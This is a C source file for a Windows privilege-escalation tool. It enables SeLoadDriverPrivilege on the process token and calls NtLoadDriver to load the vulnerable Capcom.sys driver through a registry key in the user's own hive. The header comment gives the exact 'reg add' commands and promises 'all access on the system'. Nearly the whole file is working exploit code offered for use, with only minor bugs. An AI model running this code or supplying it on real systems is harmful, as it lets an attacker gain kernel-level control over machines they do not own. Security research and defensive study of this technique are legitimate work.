/*
Reference:
https://github.com/hatRiot/token-priv
https://github.com/TarlogicSecurity/EoPLoadDriver

Enable the SeLoadDriverPrivilege of current process and then load the driver into the kernel.

First you need to add two reg keys,the command is:
reg add hkcu\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\test\Capcom.sys"
reg add hkcu\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
Then run me to load the driver(C:\test\Capcom.sys) into the kernel.

We will have all access on the system.
*/


#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#pragma comment(lib,"advapi32.lib") 
#pragma comment(lib,"user32.lib") 
#pragma comment(lib,"Ntdll.lib")


LPWSTR getUserSid(HANDLE hToken)
{

	// Get the size of the memory buffer needed for the SID
	//https://social.msdn.microsoft.com/Forums/vstudio/en-US/6b23fff0-773b-4065-bc3f-d88ce6c81eb0/get-user-sid-in-unmanaged-c?forum=vcgeneral
	//https://msdn.microsoft.com/en-us/library/windows/desktop/aa379554(v=vs.85).aspx

	DWORD dwBufferSize = 0;
	if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwBufferSize) &&
		(GetLastError() != ERROR_INSUFFICIENT_BUFFER))
	{
		wprintf(L"GetTokenInformation failed, error: %d\n",
			GetLastError());
		return NULL;
	}

	//https://social.msdn.microsoft.com/Forums/vstudio/en-US/6b23fff0-773b-4065-bc3f-d88ce6c81eb0/get-user-sid-in-unmanaged-c?forum=vcgeneral
	PTOKEN_USER pUserToken = (PTOKEN_USER)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		dwBufferSize);

	if (pUserToken == NULL) {
		HeapFree(GetProcessHeap(), 0, (LPVOID)pUserToken);
		return NULL;
	}

	// Retrive token info
	if (!GetTokenInformation(
		hToken,
		TokenUser,
		pUserToken,
		dwBufferSize,
		&dwBufferSize))
	{
		GetLastError();
		return NULL;
	}

	// Check if SID is valid
	if (!IsValidSid(pUserToken->User.Sid))
	{
		wprintf(L"The owner SID is invalid.\n");
		return NULL;
	}

	LPWSTR sidString;
	ConvertSidToStringSidW(pUserToken->User.Sid, &sidString);
	return sidString;
}

ULONG
LoadDriver(HANDLE hToken)
{
	UNICODE_STRING DriverServiceName;
	ULONG dwErrorCode;
	NTSTATUS status;

	typedef NTSTATUS(_stdcall *NT_LOAD_DRIVER)(IN PUNICODE_STRING DriverServiceName);
	typedef void (WINAPI* RTL_INIT_UNICODE_STRING)(PUNICODE_STRING, PCWSTR);

	NT_LOAD_DRIVER NtLoadDriver = (NT_LOAD_DRIVER)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtLoadDriver");
	RTL_INIT_UNICODE_STRING RtlInitUnicodeString = (RTL_INIT_UNICODE_STRING)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");

	LPWSTR win7regPath = new WCHAR[MAX_PATH];
	ZeroMemory(win7regPath, MAX_PATH);
	LPWSTR userSidStr;
	userSidStr = getUserSid(hToken);
	if (userSidStr == NULL)
	{
		wprintf(L"[+] Error while getting user SID\n");
		CloseHandle(hToken);
		hToken = NULL;
	}

	lstrcat(win7regPath, L"\\Registry\\User\\");
	lstrcat(win7regPath, userSidStr);
	lstrcat(win7regPath, L"\\System\\CurrentControlSet\\CAPCOM");

	RtlInitUnicodeString(&DriverServiceName, win7regPath);

	status = NtLoadDriver(&DriverServiceName);
	printf("NTSTATUS: %08x, WinError: %d\n", status, GetLastError());

	if (!NT_SUCCESS(status))
		return RtlNtStatusToDosError(status);

	return 0;
}

int IsTokenSystem(HANDLE tok)
{
	DWORD Size, UserSize, DomainSize;
	SID *sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64];
	TOKEN_USER *User;
	Size = 0;
	GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
	if (!Size)
		return 0;

	User = (TOKEN_USER *)malloc(Size);
	assert(User);
	GetTokenInformation(tok, TokenUser, User, Size, &Size);
	assert(Size);
	Size = GetLengthSid(User->User.Sid);
	assert(Size);
	sid = (SID *)malloc(Size);
	assert(sid);

	CopySid(Size, sid, User->User.Sid);
	UserSize = (sizeof UserName / sizeof *UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof *DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);

	printf("whoami:\n%S\\%S\n", DomainName, UserName);
	if (!_wcsicmp(UserName, L"SYSTEM"))
		return 0;
	return 1;
}

VOID RetPrivDwordAttributesToStr(DWORD attributes, LPTSTR szAttrbutes)
{
	UINT len = 0;
	if (attributes & SE_PRIVILEGE_ENABLED)
		len += wsprintf(szAttrbutes, TEXT("Enabled"));
	if (attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT)
		len += wsprintf(szAttrbutes, TEXT("Enabled by default"));
	if (attributes & SE_PRIVILEGE_REMOVED)
		len += wsprintf(szAttrbutes, TEXT("Removed"));
	if (attributes & SE_PRIVILEGE_USED_FOR_ACCESS)
		len += wsprintf(szAttrbutes, TEXT("Used for access"));
	if (szAttrbutes[0] == 0)
		wsprintf(szAttrbutes, TEXT("Disabled"));
	return;
}

int GetTokenPrivilege(HANDLE tok)
{
	PTOKEN_PRIVILEGES ppriv = NULL;
	DWORD dwRet = 0;
	GetTokenInformation(tok, TokenGroups, ppriv, dwRet, &dwRet);
	if (!dwRet)
		return 0;
	ppriv = (PTOKEN_PRIVILEGES)calloc(dwRet, 1);
	GetTokenInformation(tok, TokenPrivileges, ppriv, dwRet, &dwRet);
	printf("\nwhoami /priv\n");
	for (int i = 0; i < ppriv->PrivilegeCount; i++)
	{
		TCHAR lpszPriv[MAX_PATH] = { 0 };
		DWORD dwRet = MAX_PATH;
		BOOL n = LookupPrivilegeName(NULL, &(ppriv->Privileges[i].Luid), lpszPriv, &dwRet);
		printf("%-50ws", lpszPriv);
		TCHAR lpszAttrbutes[1024] = { 0 };
		RetPrivDwordAttributesToStr(ppriv->Privileges[i].Attributes, lpszAttrbutes);
		printf("%ws\n", lpszAttrbutes);
	}
	return 1;
}

BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
{

	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, priv, &luid))
	{
		printf("[!]LookupPrivilegeValue error\n");
		return 0;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		printf("[!]AdjustTokenPrivileges error\n");
		return 0;
	}

	IsTokenSystem(hToken);
	GetTokenPrivilege(hToken);

	return TRUE;
}

int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		printf("[!]OpenProcessToken error\n");
		return 0;
	}

	EnablePriv(hToken, SE_LOAD_DRIVER_NAME);
	LoadDriver(hToken);
	return 0;
}
